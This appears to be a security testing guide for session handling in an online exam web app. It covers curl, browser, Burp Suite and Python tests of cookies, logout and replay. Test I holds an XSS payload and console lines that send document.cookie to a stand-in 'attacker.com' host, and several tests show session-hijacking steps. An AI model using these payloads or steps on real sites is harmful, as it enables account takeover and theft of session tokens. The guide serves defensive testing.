# Session Testing Procedure - Step by Step

## **QUICK START: 5-Minute Test**

### **Test A: Create Session & Access Dashboard**

#### **Step 1: Open Terminal**
```bash
curl -c cookies.txt -X POST https://oes.freshmilkstraightfromsource.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"student1","password":"pass123"}'

# Response:
# {"message":"Login successful","user":{...},"sessionCreated":true}

# Cookies saved to cookies.txt
```

#### **Step 2: Check Saved Cookie**
```bash
cat cookies.txt

# Should show something like:
# .freshmilkstraightfromsource.com  TRUE  /  TRUE  1711000000  sessionID  abc123xyz789
#                                         ↑
#                                    HttpOnly flag
```

#### **Step 3: Use Cookie to Access Protected Route**
```bash
curl -b cookies.txt https://oes.freshmilkstraightfromsource.com/api/auth/me

# Response:
# {
#   "user": {
#     "id": 5,
#     "username": "student1",
#     "role": "student",
#     "email": "student1@example.com"
#   },
#   "session": {
#     "id": "abc123xyz789abc",
#     "expiresAt": "2024-03-21T10:30:00Z"
#   }
# }
```

#### **What This Proves:**
- ✅ Session created on login
- ✅ Session persists across requests
- ✅ No password needed after login (just session cookie)

---

### **Test B: Login Without Session (Should Fail)**

#### **Step 1: Try to access dashboard without cookie**
```bash
curl https://oes.freshmilkstraightfromsource.com/api/auth/me

# Response:
# {"message":"Not authenticated. Please login."}  [401]
```

#### **What This Proves:**
- ✅ Protected routes require valid session
- ✅ Can't access dashboard without login
- ✅ Authentication middleware works

---

### **Test C: Logout & Session Destruction**

#### **Step 1: Logout**
```bash
curl -b cookies.txt -X POST https://oes.freshmilkstraightfromsource.com/api/logout

# Response:
# {"message":"Logged out successfully"}
```

#### **Step 2: Try to use old session**
```bash
curl -b cookies.txt https://oes.freshmilkstraightfromsource.com/api/auth/me

# Response:
# {"message":"Not authenticated. Please login."}  [401]
```

#### **What This Proves:**
- ✅ Session destroyed on logout
- ✅ Session cookie no longer valid
- ✅ Replay attack prevented

---

## **ADVANCED: Browser-Based Testing**

### **Test D: Session Hijacking - Manual Cookie Copy**

#### **Part 1: Student 1 Logs In**

1. **Open Firefox/Chrome**
2. **Go to:** https://oes.freshmilkstraightfromsource.com/login
3. **Login as Student:**
   - Username: `student1`
   - Password: `pass123`
4. **Verify logged in:** You see dashboard

#### **Part 2: Extract Session Cookie**

1. **Open DevTools:** Press `F12`
2. **Go to:** `Application` tab → `Cookies` → `https://oes.freshmilkstraightfromsource.com`
3. **Look for cookie named:** `sessionID` (or similar)
4. **Copy the VALUE** (long string of characters)
   ```
   Example: abc123xyz789pqr456stu789vwx012yz
   ```

#### **Part 3: Test HttpOnly Protection**

1. **Still in DevTools Console**, try to access:
   ```javascript
   console.log(document.cookie);
   ```

2. **Result:**
   - ✅ **Empty** or only non-HttpOnly cookies (PROTECTED!)
   - ❌ **Shows sessionID** (VULNERABLE!)

#### **Part 4: Manual Cookie Injection (Simulate Attacker)**

1. **Open NEW browser window/Incognito**
2. **Go to:** https://oes.freshmilkstraightfromsource.com (don't login yet)
3. **Open DevTools:** `F12`
4. **Go to:** `Application` → `Cookies`
5. **Add new cookie:**
   - Name: `sessionID`
   - Value: [paste copied value from Part 2]
   - Domain: `.freshmilkstraightfromsource.com`
   - Path: `/`
6. **Save/Close DevTools**

#### **Part 5: Access as Hijacker (Without Password!)**

1. **Refresh page or navigate to:** https://oes.freshmilkstraightfromsource.com/dashboard
2. **Verify:** You see student1's dashboard!
   - Exams taken
   - Results
   - Profile info
3. **Proof:** You logged in WITHOUT knowing student1's password!

#### **What This Demonstrates:**
- 🔴 **Session Hijacking Works:** Attacker can impersonate user
- 🔴 **No Password Needed:** Just cookie access needed
- ✅ **But HttpOnly Prevents JavaScript Theft:** Script-based attacks (XSS) blocked
- ✅ **But Secure Flag Prevents Network Theft:** Network sniffing blocked

---

### **Test E: Session Replay After Logout**

#### **Step 1: Save Session Before Logout**

1. **Copy sessionID value again** (from previous test)
2. **Write down/save:** `sessionID=abc123xyz789...`

#### **Step 2: Logout as Original Student**

1. **In original browser (student1 logged in):**
2. **Logout:** Click logout button or API: `POST /api/logout`
3. **Verify:** Logged out (see login page)

#### **Step 3: Attempt Replay with Saved Session**

1. **Open new incognito window**
2. **Add cookie (from Step 1)** using DevTools
3. **Navigate to dashboard**
4. **Result:**
   - ✅ **"Not authenticated" message** (PROTECTED!)
   - ❌ **Sees student1's dashboard** (VULNERABLE!)

#### **What This Demonstrates:**
- ✅ **Session Doesn't Persist After Logout:** Destroyed properly
- ✅ **No Replay Attack Possible:** Old session invalid
- ✅ **Must Login Again:** Fresh session required

---

### **Test F: Cookie Security Flags Inspection**

#### **Using Browser DevTools:**

1. **Open DevTools** → `Network` tab
2. **Login:** `POST /api/login`
3. **Find login request** in Network history
4. **Click on it** → `Response Headers`
5. **Look for line:**
   ```
   Set-Cookie: sessionID=...; HttpOnly; Secure; SameSite=Lax; Max-Age=86400; Path=/
   ```

#### **Verify Each Flag:**

```
HttpOnly     ← JavaScript can't access (document.cookie won't show it)
Secure       ← Only sent over HTTPS (not HTTP)
SameSite=Lax ← Not sent to cross-site requests (prevents CSRF)
Max-Age=86400 ← Expires in 24 hours
Path=/       ← Sent to all paths
```

#### **Compare With Vulnerable Version:**

```
❌ Vulnerable:
Set-Cookie: sessionID=...; Path=/; Max-Age=86400
(no HttpOnly, no Secure, no SameSite)

✅ Secure (ours):
Set-Cookie: sessionID=...; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
```

---

## **Burp Suite Testing**

### **Test G: Session Hijacking with Burp Repeater**

#### **Step 1: Intercept Login**

1. **Open Burp Suite Community**
2. **Proxy → Intercept → ON**
3. **In browser, send login request**
4. **Burp intercepts request**
5. **Right-click → Send to Repeater**

#### **Step 2: Observe Set-Cookie Response**

1. **In Repeater tab, click Send**
2. **Look at Response tab**
3. **Find Set-Cookie header:**
   ```
   Set-Cookie: sessionID=abc123xyz789; HttpOnly; Secure; SameSite=Lax
   ```
4. **Copy the sessionID value**

#### **Step 3: Modify Request to Use Hijacked Session**

1. **In Request tab, modify to:**
   ```
   GET /api/auth/me HTTP/1.1
   Host: oes.freshmilkstraightfromsource.com
   Cookie: sessionID=abc123xyz789
   ```
2. **Click Send**
3. **Observe:** User data returned (hijacking successful!)

#### **Step 4: Verify Session Destruction**

1. **Send logout request:**
   ```
   POST /api/logout HTTP/1.1
   Host: oes.freshmilkstraightfromsource.com
   Cookie: sessionID=abc123xyz789
   ```
2. **Send authentication request with same cookie:**
   ```
   GET /api/auth/me HTTP/1.1
   Cookie: sessionID=abc123xyz789
   ```
3. **Observe:** 401 Unauthorized (session destroyed!)

---

## **Python Scripting - Automated Testing**

### **Test H: Automated Session Testing**

#### **Script 1: Basic Session Flow**

```python
import requests
import json

BASE_URL = "https://oes.freshmilkstraightfromsource.com"

# Create session (cookies automatically managed)
session = requests.Session()

# 1. Login
print("[*] Logging in as student1...")
login_response = session.post(
    f"{BASE_URL}/api/login",
    json={"username": "student1", "password": "pass123"}
)
print(f"Login status: {login_response.status_code}")
print(f"Response: {login_response.json()}")

# Check cookies
print(f"\n[*] Cookies after login:")
for cookie in session.cookies:
    print(f"  Name: {cookie.name}")
    print(f"  Value: {cookie.value[:20]}...")
    print(f"  HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
    print(f"  Secure: {cookie.secure}")
    print(f"  SameSite: {cookie.get_nonstandard_attr('samesite')}")

# 2. Use session to access protected route
print(f"\n[*] Accessing /api/auth/me with session...")
me_response = session.get(f"{BASE_URL}/api/auth/me")
print(f"Status: {me_response.status_code}")
print(f"User: {me_response.json()['user']['username']}")

# 3. Logout
print(f"\n[*] Logging out...")
logout_response = session.post(f"{BASE_URL}/api/logout")
print(f"Status: {logout_response.status_code}")

# 4. Try to use session after logout (should fail)
print(f"\n[*] Attempting to use session after logout...")
me_response2 = session.get(f"{BASE_URL}/api/auth/me")
print(f"Status: {me_response2.status_code}")
if me_response2.status_code == 401:
    print("[✓] Session properly destroyed!")
else:
    print("[✗] Session still valid (VULNERABILITY!)")
```

#### **Script 2: Session Hijacking Test**

```python
import requests

BASE_URL = "https://oes.freshmilkstraightfromsource.com"

# Step 1: Student 1 logs in and gets session
print("[*] Student 1 logging in...")
session1 = requests.Session()
login1 = session1.post(
    f"{BASE_URL}/api/login",
    json={"username": "student1", "password": "pass123"}
)

# Extract sessionID cookie
sessionID = None
for cookie in session1.cookies:
    if cookie.name == "connect.sid" or "session" in cookie.name.lower():
        sessionID = cookie.value
        break

if sessionID:
    print(f"[*] Extracted session ID: {sessionID[:20]}...")
    
    # Step 2: Create new session (attacker)
    print(f"\n[*] Attacker hijacking session...")
    session_attacker = requests.Session()
    session_attacker.cookies.set("sessionID", sessionID)
    
    # Step 3: Access as hijacker
    print(f"[*] Attacker accessing /api/auth/me...")
    hijack_response = session_attacker.get(f"{BASE_URL}/api/auth/me")
    
    if hijack_response.status_code == 200:
        user = hijack_response.json()['user']
        print(f"[✗] HIJACKING SUCCESSFUL!")
        print(f"    Accessed as: {user['username']} (role: {user['role']})")
    else:
        print(f"[✓] Hijacking prevented (session likely invalid)")
else:
    print("[!] Could not extract session ID")
```

#### **Script 3: Timing Attack Test**

```python
import requests
import time

BASE_URL = "https://oes.freshmilkstraightfromsource.com"

# Test 1: Valid user, wrong password
print("[*] Test 1: Valid user, wrong password...")
times_valid = []
for i in range(5):
    start = time.time()
    requests.post(
        f"{BASE_URL}/api/login",
        json={"username": "admin", "password": "wrongpass"}
    )
    times_valid.append(time.time() - start)

avg_valid = sum(times_valid) / len(times_valid)
print(f"  Average time: {avg_valid:.4f}s")

# Test 2: Invalid user
print("[*] Test 2: Invalid user...")
times_invalid = []
for i in range(5):
    start = time.time()
    requests.post(
        f"{BASE_URL}/api/login",
        json={"username": "nonexistent", "password": "wrongpass"}
    )
    times_invalid.append(time.time() - start)

avg_invalid = sum(times_invalid) / len(times_invalid)
print(f"  Average time: {avg_invalid:.4f}s")

# Compare
diff = abs(avg_valid - avg_invalid)
print(f"\n[*] Time difference: {diff:.6f}s ({diff*1000:.2f}ms)")
if diff < 0.05:  # Less than 50ms
    print("[✓] Timing attack prevented (constant-time)")
else:
    print("[✗] Possible timing attack vulnerability")
```

---

## **Real-World Attack Simulation**

### **Test I: XSS + Session Stealing (Educational Only)**

#### **Scenario:**
Attacker injects script into exam question to steal session cookies.

#### **Vulnerable Code (without HttpOnly):**
```html
<!-- Injected in question_text field -->
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

#### **Protected Code (with HttpOnly):**
```javascript
// When script runs:
document.cookie  // Returns empty string (HttpOnly prevents access)
// Attacker gets nothing!
```

#### **How to Test:**

1. **Without HttpOnly** (vulnerable):
   ```javascript
   // Open DevTools Console
   fetch('https://attacker.com/steal?c=' + document.cookie);
   // Would send sessionID to attacker
   ```

2. **With HttpOnly** (protected):
   ```javascript
   // Open DevTools Console
   fetch('https://attacker.com/steal?c=' + document.cookie);
   // Sends empty string (sessionID not in document.cookie)
   ```

---

## **Mobile Testing**

### **Test J: Session Persistence on Mobile**

#### **Using Charles Proxy (man-in-the-middle testing):**

1. **Install Charles Proxy** on computer
2. **Configure mobile device** to use Charles as proxy
3. **Open OES app on mobile**
4. **Login** in Charles
5. **Observe:**
   - Unencrypted requests visible (if no HTTPS pinning)
   - Cookies visible in Charles
   - Session tracking possible

#### **Protection:**
```
✅ HTTPS + Certificate Pinning
✅ Secure flag + HttpOnly
❌ Charles Proxy can still intercept (if no pinning)
```

---

## **Troubleshooting**

| Issue | Solution |
|-------|----------|
| Session not persisting | Check Set-Cookie header, verify browser accepts cookies |
| HttpOnly flag missing | Update express-session config, restart server |
| Logout doesn't destroy session | Verify req.session.destroy() is called |
| Session timeout too short | Check maxAge setting, increase if needed |
| HTTPS not working | Verify NODE_ENV=production, certificate valid |
| Cookie not sent in requests | Check cookie domain/path matches request |

---

## **Summary Checklist**

- [ ] **Test A:** Session created and persists
- [ ] **Test B:** Protected route requires session
- [ ] **Test C:** Session destroyed on logout
- [ ] **Test D:** Manual hijacking possible (but XSS prevented)
- [ ] **Test E:** Replay attack fails
- [ ] **Test F:** Security flags present
- [ ] **Test G:** Burp Suite confirms session handling
- [ ] **Test H:** Python automation works
- [ ] **Test I:** XSS can't steal HttpOnly cookies
- [ ] **Test J:** Mobile session works (if testing)

